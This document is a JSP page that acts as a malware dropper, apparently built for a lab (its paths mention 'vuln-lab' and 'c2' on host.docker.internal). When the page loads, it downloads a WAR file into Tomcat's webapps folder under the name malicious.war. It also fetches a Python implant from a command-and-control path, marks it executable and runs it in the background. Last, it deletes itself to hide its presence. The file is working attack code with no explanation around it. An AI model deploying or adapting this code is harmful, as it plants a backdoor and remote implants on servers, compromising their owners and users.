<%@ page import="java.io.*, java.net.*" %>
<%
    try {
        String warUrl = "http://host.docker.internal:8000/vuln-lab/app.war"; // adjust path
        String warPath = "/usr/local/tomcat/webapps/malicious.war";
        String implantUrl = "http://host.docker.internal:8000/c2/implant.py"; // adjust path
        String implantPath = "/tmp/implant.py";

        // WAR download
        BufferedInputStream warIn = new BufferedInputStream(new URL(warUrl).openStream());
        FileOutputStream warOut = new FileOutputStream(warPath);
        byte[] buffer = new byte[1024];
        int len;
        while ((len = warIn.read(buffer)) != -1) {
            warOut.write(buffer, 0, len);
        }
        warOut.close();
        warIn.close();

        // Implant download
        BufferedInputStream impIn = new BufferedInputStream(new URL(implantUrl).openStream());
        FileOutputStream impOut = new FileOutputStream(implantPath);
        while ((len = impIn.read(buffer)) != -1) {
            impOut.write(buffer, 0, len);
        }
        impOut.close();
        impIn.close();

        // Make implant executable and run in background
        Runtime.getRuntime().exec("chmod +x " + implantPath);
        Runtime.getRuntime().exec("python3 " + implantPath + " &");

        // Delete the JSP
        new File(application.getRealPath(request.getServletPath())).delete();

    } catch (Exception e) {
        e.printStackTrace();
    }
%>
